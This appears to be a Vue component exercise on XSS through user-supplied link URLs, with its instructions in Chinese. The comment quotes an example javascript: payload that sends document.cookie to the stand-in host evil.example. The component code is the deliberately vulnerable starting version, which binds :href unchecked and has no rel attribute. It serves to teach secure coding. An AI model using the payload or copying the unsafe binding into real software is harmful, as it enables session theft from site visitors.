<!--
練習 3：門市的外部連結 StoreLink
問題：門市人員在後台填「官網連結」，這裡直接 :href 綁上去。
      有人填了 javascript:fetch('https://evil.example?c='+document.cookie)，顧客一點就執行。
要求：
  1. 用 new URL(url) 解析；protocol 是 http: 或 https: 才渲染成 <a>，href 用解析後的網址
     （白名單，不要用黑名單擋 javascript:；也不要用 startsWith('http')，httpx: 也會過）
  2. <a> 要加 target="_blank" 和 rel="noopener noreferrer"
  3. 其他網址（javascript:、data:、解析不了的字串）顯示成純文字「門市名稱（原始網址）」，不渲染成連結
  4. 不能用 v-html：label、url 都是使用者輸入，用 {{ }} 顯示（會跳脫）
  5. props 改變時結果要跟著變
-->
<script setup lang="ts">
defineProps<{ label: string; url: string }>()
</script>

<template>
  <a :href="url" target="_blank">{{ label }}</a>
</template>
